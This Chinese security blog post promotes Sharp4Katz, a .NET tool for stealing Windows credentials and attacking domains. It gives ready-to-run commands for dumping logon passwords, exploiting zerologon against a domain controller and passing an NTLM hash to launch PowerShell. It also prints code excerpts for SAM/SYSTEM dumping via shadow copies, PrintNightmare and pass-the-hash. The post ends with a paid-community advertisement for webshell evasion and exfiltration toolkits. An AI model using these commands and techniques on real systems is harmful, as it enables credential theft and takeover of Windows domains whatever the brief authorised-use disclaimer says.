---
title: .NET 一款内网收集本地用户哈希的工具
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247494659&idx=1&sn=c9d5528b81a7f429f114b2b9efc6c504&chksm=fa5942eecd2ecbf82875a67bd86d1d178ceb152f4e3fcbaeb54b3d22c183958969ce77f48684&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-08-22
fetch_date: 2025-10-06T18:04:06.953605
---

# .NET 一款内网收集本地用户哈希的工具

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YicQK2HsTLtQvibTFaXAhfcErAR0x62xN1xxuNeSykibUSSib7ue8oRfEwn8ljp7XEOKdUXstVTYHC2dA/0?wx_fmt=jpeg)

# .NET 一款内网收集本地用户哈希的工具

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他方面

02

基本介绍

Sharp4Katz 是一款强大的内网信息收集工具，专用于在 Windows 环境中执行各种与凭证相关的攻击和漏洞利用。该工具集成了多个常见的内网技术，例如 logonpasswords、wdigest、dcsync、pth、zerologon 和 printnightmare，使其成为渗透测试人员和安全研究人员的利器。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8HibppicvjAs3FBwutvmB8d3jCaJHsk5u7BmvsUX5RdOiaWy8hiccrQxvwOgbMQHc1zvx13C9u74ibkpw/640?wx_fmt=jpeg&from=appmsg)

03

使用方法

Sharp4Katz 支持多达14种内网命令，以下是一个列出卷影副本的命令，如下所示。

```
Sharp4Katz.exe --Command listshadows
```

另外，还支持提取当前登录用户的凭证，包括明文密码和哈希值。

```
Sharp4Katz.exe --Command logonpasswords
```

通过 zerologon 参数 执行漏洞来获取域控制器的权限，如下所示。

```
Sharp4Katz.exe --Command zerologon --Mode exploit --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$
```

支持Pass-the-Hash启动不同账户下的新进程，命令如下所示。

```
Sharp4Katz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash
```

比如，利用NtlmHash传递哈希启动powershell.exe进程，由于本地没有其他用户，所以依旧使用Admin账户模拟演示，具体命令如下所示。

```
Sharp4Katz.exe --Command pth --User Administrator --Domain PC-20230831QDRR --NtlmHash 31d6cfe0d16ae931b73c59d7e0c089c0 --Binary "\WindowsPowerShell\v1.0\powershell.exe"
```

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicQK2HsTLtQvibTFaXAhfcErnt6wZfnBia4pguGyDrZtO7qHKP8jvzpngRR3MvybCyjvCkV0KiateibLg/640?wx_fmt=png&from=appmsg)

04

原理解析

Sharp4Katz 的核心代码设计简单明了，每个命令都有相应的判断逻辑和执行过程。例如，处理 hivenightmare 命令时，代码会首先检查系统是否存在卷影副本，并使用找到的第一个卷影副本来导出 SYSTEM 和 SAM 文件中的敏感数据。

```
bool flag44 = command.Equals("hivenightmare");
if (flag44)
{
    List<string> list2 = Shadow.ListShadowCopies();
    bool flag45 = list2.Count > 0;
    if (flag45)
    {
        Console.WriteLine("[*] Using shadowcopy {0}", list2.ToArray()[0]);
        string system2 = string.Format("{0}Windows\\System32\\config\\{1}", list2.ToArray()[0], "SYSTEM");
        string sam2 = string.Format("{0}Windows\\System32\\config\\{1}", list2.ToArray()[0], "SAM");
        Sam.LsadumpSam(system2, sam2);
    }
    else
    {
        Console.WriteLine("[x] No shadowcopy found");
    }
}
```

类似地，处理 printnightmare 命令时，代码会检查是否提供了 library 和 target 参数，并根据这些参数调用 PrintNightmare 类来执行漏洞利用，如下所示。

```
bool flag41 = command.Equals("printnightmare");
if (flag41)
{
    bool flag42 = string.IsNullOrEmpty(library);
    if (flag42)
    {
        Console.WriteLine("[x] Missing or incorrect required parameter -> Library");
    }
    else
    {
        bool flag43 = string.IsNullOrEmpty(target);
        if (flag43)
        {
            Console.WriteLine("[x] Missing or incorrect required parameter -> Target");
        }
        else
        {
            PrintNightmare.RunPrintNightmare(target, library, authuser, authdomain, authpassword, 9, "host");
        }
    }
}
```

此外，工具还包含针对 pth（Pass-the-Hash）的实现，允许用户通过提供必要的参数来模拟身份认证，并执行指定的二进制文件。

```
intPtr3 = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, process.Id);
Keys keys = new Keys(intPtr3, lsasrvMem, osversionHelper);
bool flag15 = command.Equals("pth");
if (flag15)
{
    bool flag16 = string.IsNullOrEmpty(binary);
    if (flag16)
    {
        binary = "cmd.exe";
    }
    Pth.CreateProcess(intPtr3, lsasrvMem, intPtr2, osversionHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), user, domain, ntlmHash, aes128, aes256, rc4, binary, arguments, luid, impersonate);
}
```

综上，Sharp4Katz 是一款功能丰富的工具，能够帮助安全研究人员和渗透测试人员更高效地执行凭证提取和漏洞利用操作。工具已经打包在星球，感兴趣的朋友可以加入自取。

05

推荐阅读

从漏洞分析到安全攻防，我们涵盖了.NET安全各个关键方面，为您呈现最新、最全面的.NET安全知识，下面是公众号发布的精华文章集合，推荐大家阅读！

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8TQhCZMggf71ffibqISJ8f5naPJacnjn0roDyxxnAibmuwDJq2p1GTBpicZhnM9o9gTIu9S9ia8Uqwtw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp&retryload=1)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247493952&idx=4&sn=db68011fb075c1d02268811163646b53&chksm=fa5947adcd2ecebbb1ca6659f289a5e344e37d1136fe0bd9272b5578e4c71bb19bb250e934d3&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOE2ogFoYIdqnYynqF6XyicI7XfRsWsn36wsCpKpAJcIQOicZUhbDJOe0w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488762&idx=1&sn=a5710927a6ba09b5c83adf616e2b12ae&chksm=fa5aba17cd2d330119d1ab2ce4b3a434274f0adf96729dbf8f04bef16c389565fc144f84d341&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOeP3ichLEiafhGiawd8mjkHYBalO37fN8QQkNdic1hjjY2Nvw2Bib6UvibDRA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOjWgak8cI7Mic1wTt3YSKqsbLl9rPe0cF9WGtOEuiceLreTNtNVib6IKlw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxO8jJ97qqWlY6XR03DqSnutcHFYibDtVG5Y2wEaK4p2bzEicZblY4oQyGg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOe1viaia4aoFceunsUdIna4DPbmemW1EqlBMrovOoE6bdAFF3iaApxz5qA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d342f887c117e4858f1cb&scene=21#wechat_redirect)

06

欢迎加入.NET安全星球

为了更好地应对基于.NET技术栈的风险识别和未知威胁，dotNet安全矩阵星球从创建以来一直聚焦于.NET领域的安全攻防技术，定位于高质量安全攻防星球社区，也得到了许多师傅们的支持和信任，通过星球深度连接入圈的师傅们，一起推动.NET安全高质量的向前发展。 星球门票后期价格随着内容和质量的不断沉淀会适当提高，因此越早加入越好！

    目前dot.Net安全矩阵星球已成为中国.NET安全领域最知名、最活跃的技术知识库之一，从.NET Framework到.NET Core，从Web应用到PC端软件应用，无论您是初学者还是经验丰富的开发人员，都能在这里找到对应的安全指南和最佳实践。

星球汇聚了各行业安全攻防技术大咖，并且每日分享.NET安全技术干货以及交流解答各类技术等问题，社区中发布很多高质量的.NET安全资源，可以说市面上很少见，都是干货。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibzerwUbGOupPoJgYlZNMo1gg58eGoicPibjMBKkEo1zOia6zOyeupYasZZ9DTFvJVvzJQTEuhKrvTsA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8DlZsGiaRRGghficKFQt58Ueoynsb0my3uzMAb7VwM5bgtnb4nbl4c9xdEjGraUXic6pO0p38xmWiaRQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOc2SogKzZ16SD7dpzF3v81kia4ZAx5QU5ibnNibEo8kZZSJgrficz4Ckxwg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

星球文化始终认为授人以鱼不如授人以渔！加入星球后可以跟星主和嘉宾们一对一提问交流，20+个专题栏目涵盖了点、线、面、体等知识面，助力师傅们快速成长！其中主题包括.NET Tricks、漏洞分析、内存马、代码审计、预编译、反序列化、webshell免杀、命令执行、C#工具库等等。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YiccvW0LwqSx3grm4bgM0fz01qCxrYGBR94wibZ7sk1zIO9DzCgviab9vmUic8qmvynXhSM8LxFhGG97w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

    我们倾力打造专刊、视频等配套学习资源，循序渐进的方式引导加深安全攻防技术提高以及岗位内推等等服务。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9XgicSeCfnDO0KyvDNdCZhG3pTSWHRekG0Wrp0FXyHO1mz9ia5uiaICjCmg5jIzx4ERLU8MjXWVSkCw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

我们还有一个会员专属的内部星球陪伴群，加入的成员可以通过在群里提出问题或参与论的方式来与其他成员交流思想和经验。此外还可以通过星球或者微信群私聊向我们进行提问，以获取帮助迅速解决问题。

为了助力大家在2024国家级hvv演练中脱颖而出，我们特别整理出了一套涵盖dotNet安全矩阵星球的八大.NET相关方向工具集。

```
.NET 免杀WebShell
.NET 反序列化漏洞
.NET 安全防御绕过
.NET 内网信息收集
.NET 本地权限提升
.NET 内网横向移动
.NET 目标权限维持
.NET 数据外发传输
```

这些阶段所涉及的工具集不仅代表了当前.NET安全领域的最前沿技术，更是每一位网络安全爱好者不可或缺的实战利器。

![](https://m...